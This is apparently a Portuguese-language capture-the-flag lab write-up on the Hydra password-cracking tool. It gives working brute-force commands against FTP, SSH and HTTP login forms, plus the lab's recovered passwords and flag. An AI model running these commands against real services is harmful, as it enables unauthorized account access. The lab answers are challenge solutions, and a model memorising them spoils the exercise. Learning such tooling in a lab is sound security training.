# _**Contexto de Brute force**_
<mark>Hydra</mark> é um programa de quebra de senhas online por força bruta; uma ferramenta rápida para "hackear" senhas de login em sistemas  
Podemos usar o Hydra para percorrer uma lista e aplicar "força bruta" em algum serviço de autenticação  
Imagine tentar adivinhar manualmente a senha de alguém em um serviço específico (SSH, Formulário de Aplicativo Web, FTP ou SNMP) - podemos usar o Hydra para percorrer uma lista de senhas e acelerar esse processo, determinando a senha correta  

Hydra tem a capacidade de força bruta nos seguintes protocolos: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 e v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC e XMPP  

Isso mostra a importância de usar uma senha forte  
Se sua senha for comum, não contiver caracteres especiais e/ou não tiver mais de 8 caracteres, ela estará sujeita a ser adivinhada  
Existem 100 milhões de listas de senhas contendo senhas comuns, então, quando um aplicativo pronto para uso usa uma senha fácil para fazer login, certifique-se de alterá-la do padrão!  

***

**Utilizando Hydra**
As opções que passamos para o Hydra dependem do serviço (protocolo) que estamos atacando  
Por exemplo, se quiséssemos usar o FTP por força bruta com o nome de usuário sendo _user_ e a lista de senhas sendo _passlist.txt_, usaríamos o seguinte comando:
> ```bash
> hydra -l user -P passlist.txt ftp://[ip_address]
> ```

***

**Post web-form**
Também podemos usar o Hydra para forçar formulários web  
Você precisará saber qual tipo de solicitação ele está fazendo – normalmente, são usados ​​métodos GET ou POST  
Você pode usar a guia de rede do seu navegador (nas ferramentas do desenvolvedor) para ver os tipos de solicitação ou simplesmente visualizar o código-fonte  
Exemplo:
> ```bash
> hydra -l [username] -P [password list] [ip] http-post-form "/[login url]:username=^USER^&password=^PASS^:F=incorrect" -V
> ```

# _**Execução**_
Realizando brute-force com o Hydra no serviço SSH
> ```bash
> hydra -l molly -P ../wordlists/rockyou.txt [ip_address] -t 4 ssh
> ```

**senha:** butterfly
```cat flag2.txt``` para buscar a flag  

Realizando brute-force com o Hydra no serviço HTTP
> ```bash
> hydra -l molly -P ../wordlists/rockyou.txt [ip_address] http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
> ```

**Senha descoberta** = sunshine
